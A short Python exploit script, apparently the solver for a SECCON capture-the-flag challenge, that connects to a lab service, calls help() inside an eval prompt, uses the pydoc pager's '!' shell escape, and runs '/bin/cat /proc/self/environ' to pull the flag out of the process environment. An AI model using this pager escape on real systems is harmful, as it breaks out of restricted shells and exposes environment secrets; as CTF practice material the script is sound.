from ptrlib import *
import os

HOST = os.getenv('SECCON_HOST', "localhost")
PORT = os.getenv('SECCON_PORT', "10042")

sock = Socket(HOST, int(PORT))

sock.sendlineafter("value 2: ", "help()")
sock.sendlineafter("help> ", "+")
sock.sendlineafter("--More--", "!/bin/cat /proc/self/environ")
print(sock.recvregex("SECCON\{.+\}"))

sock.close()
